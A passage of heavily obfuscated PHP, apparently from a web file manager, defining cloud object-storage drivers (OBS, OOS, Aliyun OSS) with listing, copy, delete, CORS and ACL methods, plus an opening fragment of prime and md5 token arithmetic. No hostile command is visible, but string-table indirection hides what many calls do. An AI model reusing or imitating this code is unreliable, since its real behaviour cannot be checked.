$¾¼íõæ³ != 0) { $’§…ÜÆ• = $¥üÑ²ØÀ; $¥üÑ²ØÀ = $¾¼íõæ³; $åçÕşæ” = $»âµ¨ [804]; $¾¼íõæ³ = $’§…ÜÆ• % $¾¼íõæ³; $ì÷ì™ÉÄ = $»âµ¨ [805]; } if ($¾¼íõæ³ == 1) { break; } else { $¶½şÛ¢ë++; } } $©™ªÑÚ¯ = 2; $Î™üî™± = $»âµ¨ [806]; if (strlen($Î™üî™±) < $»âµ¨ [724]) { return; } for ($¾ìËú‚ = 0; $¾ìËú‚ < $¤Ïƒ‚”– * 10; $¾ìËú‚++) { if (($¤Ïƒ‚”– * $¾ìËú‚ + 1) % $¶½şÛ¢ë == 0) { $©™ªÑÚ¯ = intval(($¤Ïƒ‚”– * $¾ìËú‚ + 1) / $¶½şÛ¢ë); break; } } $ ÀºıñÇ = md5($ ¬ÇôÔ”[304] . ($ùëèç›Ã + $îîÑ´²ƒ) . $ ¬ÇôÔ”[305] . $¶½şÛ¢ë . $ ¬ÇôÔ”[305] . $©™ªÑÚ¯ . $ ¬ÇôÔ”[306]); $øË¸»–¦ = $this->stdxc50f322d($ë²¨®•¿[0], $ ÀºıñÇ); return $øË¸»–¦; } public function rijebe449d3a() { $àîüĞ‘ =& $_SERVER[£ğ°ÖØø]; $õó”–İ´ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ä¡ûÊâ = $àîüĞ‘[807]; if (!$ä¡ûÊâ) { return; } $ûÔõ¥ü = array(); $÷øîÑ®È = 1; while ($÷øîÑ®È <= (int) sqrt($õó”–İ´)) { $×õÄ÷ = $÷øîÑ®È; while (!0) { $×õÄ÷++; if ($×õÄ÷ <= 2) { $÷øîÑ®È = $×õÄ÷; break; } else { if ($×õÄ÷ < 2) { continue; } } $¨˜Ê¿èş = !0; for ($ş“ŒıéŸ = 2; $ş“ŒıéŸ <= sqrt($×õÄ÷); $ş“ŒıéŸ++) { if ($×õÄ÷ % $ş“ŒıéŸ == 0) { $¨˜Ê¿èş = !1; } } if ($¨˜Ê¿èş) { $÷øîÑ®È = $×õÄ÷; break; } } $ûÔõ¥ü[] = $÷øîÑ®È; } $È…’õ×é = 2; $òøöş» = $àîüĞ‘[808]; if (strlen($òøöş») < $àîüĞ‘[724]) { return; } for ($×õÄ÷ = $õó”–İ´; $×õÄ÷ > 1; $×õÄ÷--) { $¨˜Ê¿èş = !0; $Ò¬œ©Š’ = $àîüĞ‘[809]; if (!$Ò¬œ©Š’) { return; } foreach ($ûÔõ¥ü as $…÷À²¹Ø) { if ($×õÄ÷ % $…÷À²¹Ø == 0) { $¨˜Ê¿èş = !1; break; } } if ($¨˜Ê¿èş) { $È…’õ×é = $×õÄ÷; break; } } return $È…’õ×é; $×ø¼ş”ø = $àîüĞ‘[810]; while (strlen($×ø¼ş”ø) < $àîüĞ‘[693]) { if (!$×ø¼ş”ø) { break; } $×ø¼ş”ø++; } } public function cxyw52c69bcc($Ô¶ÊƒÎŞ, $Ã©©Ú½) { $ë­Íñ =& $_SERVER[Ÿ›ğøİò]; return call_user_func(array($ë­Íñ[8], $ë­Íñ[308]), $Ô¶ÊƒÎŞ, $Ã©©Ú½); } public function odvs2759ba87($îùüı®§, $‡ÇšåÑí) { $ÊåüåÓ¸ =& $_SERVER[Ÿ›ğøİò]; return call_user_func(array($ÊåüåÓ¸[309], $ÊåüåÓ¸[310]), $îùüı®§, $‡ÇšåÑí); } public function stdxc50f322d($ø›¡Àöî, $Ë”ÕëÅå) { $ÇßäÅ¶ä =& $_SERVER[Ÿ›ğøİò]; return call_user_func(array($ÇßäÅ¶ä[309], $ÇßäÅ¶ä[311]), $ø›¡Àöî, $Ë”ÕëÅå); $©ÌÈ‹ÎÚ = $_SERVER[£ğ°ÖØø][811]; if (!$©ÌÈ‹ÎÚ) { return; } } } goto aÍ„ƒ¢; f­Û²Àà: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($çøÁäÁõ) { parent::__construct($çøÁäÁõ); $this->setSignVersion($_SERVER[£ğ°ÖØø][247]); } public function fileOutImage($Ÿ‘İ§­¦, $Šš×íöø = 250) { $Ïù²àíî =& $_SERVER[£ğ°ÖØø]; if ($this->size($Ÿ‘İ§­¦) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ÿ‘İ§­¦, $Šš×íöø); } $òûë§½µ = array($Ïù²àíî[1440] => $Ïù²àíî[1441] . $Šš×íöø . $Ïù²àíî[1442]); $äûÚõù = $this->link($Ÿ‘İ§­¦, $òûë§½µ); $this->fileOutLink($äûÚõù); } public function fileOutLink($Âı¸À”ˆ) { $½ÆËœö§ =& $_SERVER[£ğ°ÖØø]; if (substr($Âı¸À”ˆ, 0, 7) == $½ÆËœö§[313]) { $Âı¸À”ˆ = $½ÆËœö§[314] . substr($Âı¸À”ˆ, 7); } header($½ÆËœö§[175] . $Âı¸À”ˆ); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($¹ç‘—Ù) { parent::__construct($¹ç‘—Ù); $this->setSignVersion($_SERVER[£ğ°ÖØø][247]); } public function fileOutLink($ş…Ú”õ) { $È¯‘“¤í =& $_SERVER[£ğ°ÖØø]; if (substr($ş…Ú”õ, 0, 7) == $È¯‘“¤í[313]) { $ş…Ú”õ = $È¯‘“¤í[314] . substr($ş…Ú”õ, 7); } header($È¯‘“¤í[175] . $ş…Ú”õ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($÷¢›ÌÙä) { parent::__construct(); include_once SDK_DIR . $_SERVER[£ğ°ÖØø][1443]; $this->_init($÷¢›ÌÙä); } public function _init($Øä›¶Øˆ) { $âö’ÅÓ =& $_SERVER[£ğ°ÖØø]; $this->config = $Øä›¶Øˆ; foreach ($Øä›¶Øˆ as $£©µãÎÀ => $­ÊõÔË) { if (isset($this->{$£©µãÎÀ})) { $this->{$£©µãÎÀ} = $­ÊõÔË; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($âö’ÅÓ[1444] . LNG($âö’ÅÓ[1445])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Í™ÎÌ„ =& $_SERVER[£ğ°ÖØø]; $Ì÷»¡×• = new OSS\Model\CorsConfig(); $ÁÏ–ÃÈ„ = new OSS\Model\CorsRule(); $ÁÏ–ÃÈ„->addAllowedOrigin($Í™ÎÌ„[1446]); $ÁÏ–ÃÈ„->addAllowedMethod($Í™ÎÌ„[1447]); $ÁÏ–ÃÈ„->addAllowedMethod($Í™ÎÌ„[1448]); $ÁÏ–ÃÈ„->addAllowedMethod($Í™ÎÌ„[1449]); $ÁÏ–ÃÈ„->addAllowedMethod($Í™ÎÌ„[1450]); $ÁÏ–ÃÈ„->addAllowedMethod($Í™ÎÌ„[165]); $ÁÏ–ÃÈ„->setMaxAgeSeconds(600); $ÁÏ–ÃÈ„->addExposeHeader($Í™ÎÌ„[1451]); $ÁÏ–ÃÈ„->addAllowedHeader($Í™ÎÌ„[1446]); $Ì÷»¡×•->addRule($ÁÏ–ÃÈ„); try { $this->client->putBucketCors($this->bucket, $Ì÷»¡×•); } catch (OSS\Core\OssException $–Åü®—”) { $this->writeLog(__FUNCTION__ . $Í™ÎÌ„[214] . $–Åü®—”->getMessage()); return !1; } return !0; } public function getBucketCors() { $íì˜ğ” =& $_SERVER[£ğ°ÖØø]; $¨ÏˆÆªÇ = null; try { $¨ÏˆÆªÇ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ü¨­±†å) { $this->writeLog(__FUNCTION__ . $íì˜ğ”[214] . $ü¨­±†å->getMessage()); return null; } if (!$¨ÏˆÆªÇ || !($“¼©‰Ù = $¨ÏˆÆªÇ->getRules())) { return null; } $™¨¨ùÎ = $“¼©‰Ù[0]->getAllowedOrigins(); $é¹®‚í— = $“¼©‰Ù[0]->getAllowedMethods(); $Üõ¾âœ… = $“¼©‰Ù[0]->getMaxAgeSeconds(); $“á˜‚Ë– = $“¼©‰Ù[0]->getExposeHeaders(); $áÊÁæ = $“¼©‰Ù[0]->getAllowedHeaders(); return array($íì˜ğ”[218] => isset($™¨¨ùÎ[0]) ? $™¨¨ùÎ[0] : $íì˜ğ”[12], $íì˜ğ”[222] => $é¹®‚í—, $íì˜ğ”[1452] => $Üõ¾âœ…, $íì˜ğ”[1453] => isset($“á˜‚Ë–[0]) ? $“á˜‚Ë–[0] : $íì˜ğ”[12], $íì˜ğ”[219] => isset($áÊÁæ[0]) ? $áÊÁæ[0] : $íì˜ğ”[12]); } public function isBucketCors() { $³àÛ¯ÑŸ =& $_SERVER[£ğ°ÖØø]; $é‚¢³´ = $this->getBucketCors(); if (!$é‚¢³´ || !is_array($é‚¢³´)) { return !1; } if ($é‚¢³´[$³àÛ¯ÑŸ[218]] != $³àÛ¯ÑŸ[220] || $é‚¢³´[$³àÛ¯ÑŸ[219]] != $³àÛ¯ÑŸ[220]) { return !1; } $›–ƒêÏ© = array_map($³àÛ¯ÑŸ[221], $é‚¢³´[$³àÛ¯ÑŸ[222]]); if (!is_array($›–ƒêÏ©)) { $›–ƒêÏ© = array(); } $Ü·ÔúîÏ = array($³àÛ¯ÑŸ[223], $³àÛ¯ÑŸ[224], $³àÛ¯ÑŸ[225], $³àÛ¯ÑŸ[226], $³àÛ¯ÑŸ[227]); $²“ùˆüÉ = array_diff($Ü·ÔúîÏ, $›–ƒêÏ©); return empty($²“ùˆüÉ); } public function mkfile($±ÅÈ§Ò¹, $¥…¤•ò¢ = '', $³•ß©¥³ = REPEAT_RENAME) { $Ã‰”Š‚ = $this->setContent($±ÅÈ§Ò¹, $¥…¤•ò¢); if ($Ã‰”Š‚ !== !1) { return $this->getPathOuter($±ÅÈ§Ò¹); } return !1; } public function mkdir($Æ½¹ìÈı, $‰¥äóÔô = REPEAT_SKIP) { if ($‰¥äóÔô && $this->_isFolder($Æ½¹ìÈı)) { return $this->getPathOuter($Æ½¹ìÈı); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Æ½¹ìÈı)); } catch (OSS\Core\OssException $ÒŞÈƒœ) { $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][214] . $ÒŞÈƒœ->getMessage()); return !1; } return $this->getPathOuter($Æ½¹ìÈı); } private function fileList($ÙÜ´çŞ, $ôŞã»Ñ‰ = '', $“¨½éÕ = 0) { $¤­Ã¤”¨ =& $_SERVER[£ğ°ÖØø]; $ÙÜ´çŞ = trim($ÙÜ´çŞ, $¤­Ã¤”¨[8]); $‘·œÌİ = empty($ÙÜ´çŞ) && $ÙÜ´çŞ !== $¤­Ã¤”¨[228] ? $¤­Ã¤”¨[12] : $ÙÜ´çŞ . $¤­Ã¤”¨[8]; $×Ú…òşÜ = $¤­Ã¤”¨[12]; $·Ì³üûâ = 1000; $ŒßÑÖª‹ = $Åì«‡Šû = array(); while (!0) { check_abort(); $°øêĞ = array($¤­Ã¤”¨[1454] => $ôŞã»Ñ‰, $¤­Ã¤”¨[1455] => $‘·œÌİ, $¤­Ã¤”¨[1456] => $·Ì³üûâ, $¤­Ã¤”¨[1457] => $×Ú…òşÜ); try { $³Ô¶ºşÑ = $this->client->listObjects($this->bucket, $°øêĞ); } catch (OSS\Core\OssException $½æ½‹óü) { $this->writeLog(__FUNCTION__ . $¤­Ã¤”¨[214] . $½æ½‹óü->getMessage()); break; } $×Ú…òşÜ = $³Ô¶ºşÑ->getNextMarker(); $õğÛÚßô = $³Ô¶ºşÑ->getObjectList(); $ß’•‘‹ = $³Ô¶ºşÑ->getPrefixList(); foreach ($õğÛÚßô as $ÄÅ®¿ÉÉ) { if ($ÄÅ®¿ÉÉ->getKey() == $‘·œÌİ) { continue; } $Ä…Î‹¾¶ = $ÄÅ®¿ÉÉ->getKey(); $˜‡¤ºİ× = $ÄÅ®¿ÉÉ->getSize(); $§ã½®äî = $ÄÅ®¿ÉÉ->getLastModified(); $† ”¼“º = trim($ÄÅ®¿ÉÉ->getETag(), $¤­Ã¤”¨[121]); $İ™Êº›ö = $“¨½éÕ ? array($¤­Ã¤”¨[32] => $Ä…Î‹¾¶, $¤­Ã¤”¨[79] => $˜‡¤ºİ×, $¤­Ã¤”¨[206] => strtotime($§ã½®äî), $¤­Ã¤”¨[1458] => $† ”¼“º) : $Ä…Î‹¾¶; $é“àÊôò = $˜‡¤ºİ× == 0 && substr($Ä…Î‹¾¶, strlen($Ä…Î‹¾¶) - 1, 1) == $¤­Ã¤”¨[8] ? !0 : !1; $“Ğì‹Òï = array($¤­Ã¤”¨[79] => $˜‡¤ºİ×, $¤­Ã¤”¨[1459] => $˜‡¤ºİ×, $¤­Ã¤”¨[88] => strtotime($§ã½®äî), $¤­Ã¤”¨[1460] => $§ã½®äî, $¤­Ã¤”¨[1458] => $† ”¼“º); $this->cacheMethodInfoSet($Ä…Î‹¾¶, $é“àÊôò, $“Ğì‹Òï); if ($é“àÊôò) { $ŒßÑÖª‹[] = $Ä…Î‹¾¶; continue; } $Åì«‡Šû[] = $İ™Êº›ö; } foreach ($ß’•‘‹ as $ÉûÓ²“Í) { $ŒßÑÖª‹[] = $ÉûÓ²“Í->getPrefix(); $this->cacheMethodInfoSet($ÉûÓ²“Í->getPrefix(), !0); } if ($×Ú…òşÜ === $¤­Ã¤”¨[12]) { break; } } $this->cacheMethodInfoSet($ÙÜ´çŞ, !0); return array($¤­Ã¤”¨[85] => $ŒßÑÖª‹, $¤­Ã¤”¨[86] => $Åì«‡Šû); } public function listObject($ğ¥óôÜÚ, $Ó…´˜Š‡ = '') { $ĞÖ¦âıõ =& $_SERVER[£ğ°ÖØø]; $ğ¥óôÜÚ = trim($ğ¥óôÜÚ, $ĞÖ¦âıõ[8]); $Òó‘îº† = empty($ğ¥óôÜÚ) && $ğ¥óôÜÚ !== $ĞÖ¦âıõ[228] ? $ĞÖ¦âıõ[12] : $ğ¥óôÜÚ . $ĞÖ¦âıõ[8]; $Ç‘äºÛÍ = $ĞÖ¦âıõ[12]; $íŞ—³À° = 1000; $ÚËÎâ“ = $İÇÂıÈ‰ = array(); while (!0) { check_abort(); $À˜êú¹ = array($ĞÖ¦âıõ[1454] => $Ó…´˜Š‡, $ĞÖ¦âıõ[1455] => $Òó‘îº†, $ĞÖ¦âıõ[1456] => $íŞ—³À°, $ĞÖ¦âıõ[1457] => $Ç‘äºÛÍ); try { $Ì±ş­×ï = $this->client->listObjects($this->bucket, $À˜êú¹); } catch (OSS\Core\OssException $¡Ú¥Ò†—) { $this->writeLog(__FUNCTION__ . $ĞÖ¦âıõ[214] . $¡Ú¥Ò†—->getMessage()); break; } $Ç‘äºÛÍ = $Ì±ş­×ï->getNextMarker(); $ƒ€ÒˆÜ  = $Ì±ş­×ï->getObjectList(); foreach ($ƒ€ÒˆÜ  as $³­ûÀ·Å) { if ($³­ûÀ·Å->getKey() == $Òó‘îº†) { continue; } $ëïßìä¯ = $³­ûÀ·Å->getKey(); $¯øâÇ»ò = $³­ûÀ·Å->getSize(); $ıŸ×¦® = $¯øâÇ»ò == 0 && substr($ëïßìä¯, strlen($ëïßìä¯) - 1, 1) == $ĞÖ¦âıõ[8] ? !0 : !1; if ($ıŸ×¦®) { continue; } (yield $¯øâÇ»ò . $ĞÖ¦âıõ[214] . $ëïßìä¯); } if ($Ç‘äºÛÍ === $ĞÖ¦âıõ[12]) { break; } } } public function copyFile($°Ãâ¥÷‰, $Ÿï»“‘Ì) { $ÓÉˆ³µ£ = $this->size($°Ãâ¥÷‰); if ($ÓÉˆ³µ£ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $°Ãâ¥÷‰, $this->bucket, $this->pathEncode($Ÿï»“‘Ì)); } catch (OSS\Core\OssException $±Îâ×Œ›) { $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][214] . $±Îâ×Œ›->getMessage()); return !1; } return $this->getPathOuter($Ÿï»“‘Ì); } $’˜ë€ÆŞ = $this->multiCopyObject($°Ãâ¥÷‰, $Ÿï»“‘Ì, $ÓÉˆ³µ£); return $’˜ë€ÆŞ ? $this->getPathOuter($Ÿï»“‘Ì) : !1; } private function multiCopyObject($èäøñ±ø, $áÇë±‚¬, $í—÷Çäª) { $öÉîÄĞ =& $_SERVER[£ğ°ÖØø]; try { $Š›ş€ = array(); if ($‡ü—Ö‡¦ = $this->hashMd5($èäøñ±ø)) { $Š›ş€ = array(OSS\OssClient::OSS_HEADERS => array($öÉîÄĞ[1461] => $‡ü—Ö‡¦)); } $Œ“›™…Ğ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($áÇë±‚¬), $Š›ş€); $Ã Æö–ş = 1; $ÈÇ²Ñˆú = 0; $¿™¥Ëû‰ = array(); $æÔ…”ä = 1024 * 1024 * 10; $ìì‚’¿ = $this->client->generateMultiuploadParts($í—÷Çäª, $æÔ…”ä); foreach ($ìì‚’¿ as $¯“òĞ·÷ => $È•€‰¶ı) { $§Ø¤Ş‘Ÿ = $ÈÇ²Ñˆú + (int) $È•€‰¶ı[$öÉîÄĞ[1462]]; $œ›Æ¾¯ = (int) $È•€‰¶ı[$öÉîÄĞ[413]] + $§Ø¤Ş‘Ÿ - 1; $§ûÔú§ = array($öÉîÄĞ[167] => $§Ø¤Ş‘Ÿ, $öÉîÄĞ[168] => $œ›Æ¾¯); $¿™¥Ëû‰[] = $this->client->uploadPartCopy($this->bucket, $èäøñ±ø, $this->bucket, $this->pathEncode($áÇë±‚¬), $Ã Æö–ş, $Œ“›™…Ğ, $§ûÔú§); $Ã Æö–ş = $Ã Æö–ş + 1; } $ù–“¨¬ = array(); foreach ($¿™¥Ëû‰ as $¯“òĞ·÷ => $ÁİÁø‹«) { $ù–“¨¬[] = array($öÉîÄĞ[308] => $¯“òĞ·÷ + 1, $öÉîÄĞ[309] => $ÁİÁø‹«); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($áÇë±‚¬), $Œ“›™…Ğ, $ù–“¨¬); } catch (OSS\Core\OssException $ÆŞ‹‚èï) { $this->writeLog(__FUNCTION__ . $öÉîÄĞ[214] . $ÆŞ‹‚èï->getMessage()); return !1; } return !0; } public function moveFile($üûıØÓ, $¥ÅóËúû) { if ($this->copyFile($üûıØÓ, $¥ÅóËúû)) { $this->remove($üûıØÓ); return $this->getPathOuter($¥ÅóËúû); } return !1; } public function delFile($¨Éı²´€) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¨Éı²´€)); } catch (OSS\Core\OssException $ÏÒë§®æ) { $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][214] . $ÏÒë§®æ->getMessage()); return !1; } return !0; } public function delFolder($³Çê’ßİ) { $ˆ½¢Éµò =& $_SERVER[£ğ°ÖØø]; if (!$this->exist($³Çê’ßİ)) { return !0; } $this->listItemCache = !1; $É’şûØÒ = $this->fileList($³Çê’ßİ); $this->listItemCache = !0; $’©®Ğœ‹ = trim($³Çê’ßİ, $ˆ½¢Éµò[8]) . $ˆ½¢Éµò[8]; if (!empty($³Çê’ßİ) && $³Çê’ßİ !== $ˆ½¢Éµò[228] && !in_array($’©®Ğœ‹, $É’şûØÒ[$ˆ½¢Éµò[85]])) { $É’şûØÒ[$ˆ½¢Éµò[85]][] = $’©®Ğœ‹; } $ìêôúÜ­ = $this->delByBatch($É’şûØÒ[$ˆ½¢Éµò[86]]); if (!$ìêôúÜ­) { return !1; } $ìêôúÜ­ = $this->delByBatch($É’şûØÒ[$ˆ½¢Éµò[85]]); if (!$ìêôúÜ­) { return !1; } return $this->delFile($’©®Ğœ‹); } private function delByBatch($¯Ì÷ÕÒã) { foreach (array_chunk($¯Ì÷ÕÒã, 1000) as $£ÁŸäÛß) { try { $this->client->deleteObjects($this->bucket, $£ÁŸäÛß); } catch (OSS\Core\OssException $ú³Ç®ñ) { $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][214] . $ú³Ç®ñ->getMessage()); return !1; } } return !0; } public function rename($ÅËéü‘Ö, $ü‹ÄÜ¬Ñ) { return $this->renameObject($ÅËéü‘Ö, $ü‹ÄÜ¬Ñ); } private function fileInfo($ÉÄ°àÁ, $Ä»Ê¢ÅÇ = false, $§ÚŠÎÕ = array()) { $œù£ü – =& $_SERVER[£ğ°ÖØø]; $õÊ¡Šœ¿ = array($œù£ü –[32] => $this->pathThis($ÉÄ°àÁ), $œù£ü –[87] => $this->getPathOuter($ÉÄ°àÁ), $œù£ü –[33] => $œù£ü –[230], $œù£ü –[79] => isset($§ÚŠÎÕ[$œù£ü –[79]]) ? $§ÚŠÎÕ[$œù£ü –[79]] : 0, $œù£ü –[169] => $this->ext($ÉÄ°àÁ)); if ($Ä»Ê¢ÅÇ) { return $õÊ¡Šœ¿; } $õÊ¡Šœ¿[$œù£ü –[231]] = $õÊ¡Šœ¿[$œù£ü –[88]] = 0; $õÊ¡Šœ¿[$œù£ü –[232]] = $õÊ¡Šœ¿[$œù£ü –[233]] = !0; if (empty($§ÚŠÎÕ)) { $ï˜ï°á£ = $this->objectMeta($ÉÄ°àÁ); if (!$ï˜ï°á£) { return $õÊ¡Šœ¿; } $§ÚŠÎÕ = array($œù£ü –[88] => strtotime($ï˜ï°á£[$œù£ü –[1460]]), $œù£ü –[79] => $ï˜ï°á£[$œù£ü –[1459]] + 0, $œù£ü –[1458] => $ï˜ï°á£[$œù£ü –[1458]]); } if (isset($§ÚŠÎÕ[$œù£ü –[1458]]) && $§ÚŠÎÕ[$œù£ü –[1458]]) { $õÊ¡Šœ¿[$œù£ü –[235]] = trim($§ÚŠÎÕ[$œù£ü –[1458]], $œù£ü –[121]); } if (isset($§ÚŠÎÕ[$œù£ü –[79]])) { $õÊ¡Šœ¿[$œù£ü –[79]] = $§ÚŠÎÕ[$œù£ü –[79]]; } if (isset($§ÚŠÎÕ[$œù£ü –[88]])) { $õÊ¡Šœ¿[$œù£ü –[88]] = $§ÚŠÎÕ[$œù£ü –[88]]; } if (isset($§ÚŠÎÕ[$œù£ü –[206]]) && !trim($õÊ¡Šœ¿[$œù£ü –[88]])) { $õÊ¡Šœ¿[$œù£ü –[88]] = $§ÚŠÎÕ[$œù£ü –[206]]; } return $õÊ¡Šœ¿; } private function folderInfo($ª†òÌÃ°, $õŞÛ—™ı = false, $ØÜú¸æ€ = array()) { $Ù©Ë êÀ =& $_SERVER[£ğ°ÖØø]; $”ĞÍ•¶è = array($Ù©Ë êÀ[32] => $this->pathThis($ª†òÌÃ°), $Ù©Ë êÀ[87] => $this->getPathOuter($Ù©Ë êÀ[8] . $ª†òÌÃ°), $Ù©Ë êÀ[33] => $Ù©Ë êÀ[78]); if ($õŞÛ—™ı) { return $”ĞÍ•¶è; } $”ĞÍ•¶è[$Ù©Ë êÀ[231]] = $”ĞÍ•¶è[$Ù©Ë êÀ[88]] = 0; $”ĞÍ•¶è[$Ù©Ë êÀ[232]] = $”ĞÍ•¶è[$Ù©Ë êÀ[233]] = !0; if (empty($ØÜú¸æ€)) { $ª†òÌÃ° = rtrim($ª†òÌÃ°, $Ù©Ë êÀ[8]) . $Ù©Ë êÀ[8]; $Ò£§¯Û¨ = $this->objectMeta($ª†òÌÃ°); if (!$Ò£§¯Û¨) { return $”ĞÍ•¶è; } $ØÜú¸æ€ = array($Ù©Ë êÀ[231] => $Ò£§¯Û¨[$Ù©Ë êÀ[584]][$Ù©Ë êÀ[1463]], $Ù©Ë êÀ[88] => strtotime($Ò£§¯Û¨[$Ù©Ë êÀ[1460]])); } if (isset($ØÜú¸æ€[$Ù©Ë êÀ[88]])) { $”ĞÍ•¶è[$Ù©Ë êÀ[88]] = $ØÜú¸æ€[$Ù©Ë êÀ[88]]; } if (isset($ØÜú¸æ€[$Ù©Ë êÀ[231]])) { $”ĞÍ•¶è[$Ù©Ë êÀ[231]] = $ØÜú¸æ€[$Ù©Ë êÀ[231]]; } return $”ĞÍ•¶è; } public function listPath($âÌÓÎ¾Ü, $Œ¿µïí£ = false) { $Ê½¬™‰µ =& $_SERVER[£ğ°ÖØø]; $Ñ«¸úÒà = $this->fileList($âÌÓÎ¾Ü, $Ê½¬™‰µ[8], !0); foreach ($Ñ«¸úÒà[$Ê½¬™‰µ[85]] as $éÍÓ¶¾ => $¸à«»İ¥) { $Ñ«¸úÒà[$Ê½¬™‰µ[85]][$éÍÓ¶¾] = $this->folderInfo($¸à«»İ¥, $Œ¿µïí£, $¸à«»İ¥); } foreach ($Ñ«¸úÒà[$Ê½¬™‰µ[86]] as $éÍÓ¶¾ => $¸à«»İ¥) { $Ñ«¸úÒà[$Ê½¬™‰µ[86]][$éÍÓ¶¾] = $this->fileInfo($¸à«»İ¥[$Ê½¬™‰µ[32]], $Œ¿µïí£, $¸à«»İ¥); } return $Ñ«¸úÒà; } protected function infoChildren($ÏÃÔ§é, &$ä«‘Ôƒ) { $ª€âş÷˜ =& $_SERVER[£ğ°ÖØø]; $’²öİˆ¯ = $this->fileList($ÏÃÔ§é, $ª€âş÷˜[12], !0); $ä«‘Ôƒ[$ª€âş÷˜[81]] += count($’²öİˆ¯[$ª€âş÷˜[85]]); $ä«‘Ôƒ[$ª€âş÷˜[80]] += count($’²öİˆ¯[$ª€âş÷˜[86]]); foreach ($’²öİˆ¯[$ª€âş÷˜[86]] as $äƒ«†æĞ) { if (!$äƒ«†æĞ || !$äƒ«†æĞ[$ª€âş÷˜[79]]) { continue; } $ä«‘Ôƒ[$ª€âş÷˜[79]] += $äƒ«†æĞ[$ª€âş÷˜[79]]; } } public function has($«¯œŸˆû, $„ï¨Š» = false, $ŒÀ¦ø = true) { $é‡Ñõğã =& $_SERVER[£ğ°ÖØø]; $«¯œŸˆû = trim($«¯œŸˆû, $é‡Ñõğã[8]); $ñÀ¦Æ€Ï = empty($«¯œŸˆû) && $«¯œŸˆû !== $é‡Ñõğã[228] ? $é‡Ñõğã[12] : $«¯œŸˆû . $é‡Ñõğã[8]; $–¶ıó = $é‡Ñõğã[12]; $ã³ÕÊû¥ = 500; $í’íª®ø = $ƒœ½õ‘® = 0; while (!0) { check_abort(); $Ôª×¤ß = array($é‡Ñõğã[1454] => $é‡Ñõğã[8], $é‡Ñõğã[1455] => $ñÀ¦Æ€Ï, $é‡Ñõğã[1456] => $ã³ÕÊû¥, $é‡Ñõğã[1457] => $–¶ıó); try { $Éë§»¾ = $this->client->listObjects($this->bucket, $Ôª×¤ß); } catch (OSS\Core\OssException $ˆùÛµçº) { $this->writeLog(__FUNCTION__ . $é‡Ñõğã[214] . $ˆùÛµçº->getMessage()); break; } $–¶ıó = $Éë§»¾->getNextMarker(); $ÛÖ’„–’ = $Éë§»¾->getObjectList(); $’•“ã± = $Éë§»¾->getPrefixList(); if ($„ï¨Š») { if (count($ÛÖ’„–’) > 1 || count($ÛÖ’„–’) == 1 && $ÛÖ’„–’[0]->getKey() != $ñÀ¦Æ€Ï) { $í’íª®ø += count($ÛÖ’„–’) - 1; } if (!empty($’•“ã±)) { $ƒœ½õ‘® += count($’•“ã±); } if ($–¶ıó === $é‡Ñõğã[12]) { break; } continue; } if ($ŒÀ¦ø) { if (!empty($ÛÖ’„–’)) { if (count($ÛÖ’„–’) > 1 || $ÛÖ’„–’[0]->getKey() != $ñÀ¦Æ€Ï) { return !0; } } } else { if (!empty($’•“ã±)) { return !0; } } if ($–¶ıó === $é‡Ñõğã[12]) { break; } } if ($„ï¨Š») { return array($é‡Ñõğã[239] => $í’íª®ø, $é‡Ñõğã[240] => $ƒœ½õ‘®); } return !1; } public function listAll($ôïãùÏ) { $¶ºÃÁì =& $_SERVER[£ğ°ÖØø]; $¬Ñˆ×“ş = $this->fileList($ôïãùÏ, $¶ºÃÁì[12], !0); $Ÿøı‚• = array_to_keyvalue($¬Ñˆ×“ş[$¶ºÃÁì[86]], $¶ºÃÁì[32]); foreach ($¬Ñˆ×“ş[$¶ºÃÁì[85]] as $’ºÅğÙ°) { if (is_string($’ºÅğÙ°)) { $Ÿøı‚•[$’ºÅğÙ°] = array($¶ºÃÁì[79] => 0); } } return $this->listAllFiles($ôïãùÏ, $Ÿøı‚•); } public function canRead($ğèæÁ¢‘) { $±’Ğ”ŠŸ =& $_SERVER[£ğ°ÖØø]; $õòÜï‘İ = $this->pathAcl($ğèæÁ¢‘); return $õòÜï‘İ == $±’Ğ”ŠŸ[1464] || $õòÜï‘İ == $±’Ğ”ŠŸ[628] ? !0 : !1; } public function canWrite($·ƒ”¢¼”) { $ã×Ì†Çâ = $this->pathAcl($·ƒ”¢¼”); return $ã×Ì†Çâ == $_SERVER[£ğ°ÖØø][628] ? !0 : !1; } public function pathAcl($¿£ö¹ÊŒ) { $¥Å¢Ş¢ò =& $_SERVER[£ğ°ÖØø]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÓäìÒíİ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¿£ö¹ÊŒ)); } catch (OSS\Core\OssException $ÃÒÈæÓã) { $this->writeLog(__FUNCTION__ . $¥Å¢Ş¢ò[214] . $ÃÒÈæÓã->getMessage()); return !1; } $«üÁŞ‘ä = $ÓäìÒíİ == $¥Å¢Ş¢ò[37] ? $this->bucketAcl : $ÓäìÒíİ; if ($«üÁŞ‘ä == $¥Å¢Ş¢ò[1465]) { return $¥Å¢Ş¢ò[1464]; } if ($«üÁŞ‘ä == $¥Å¢Ş¢ò[1466]) { return $¥Å¢Ş¢ò[628]; } return $«üÁŞ‘ä; } private function chmodPath($í­¶òÈÎ, $èØê¶Ÿå = '') { 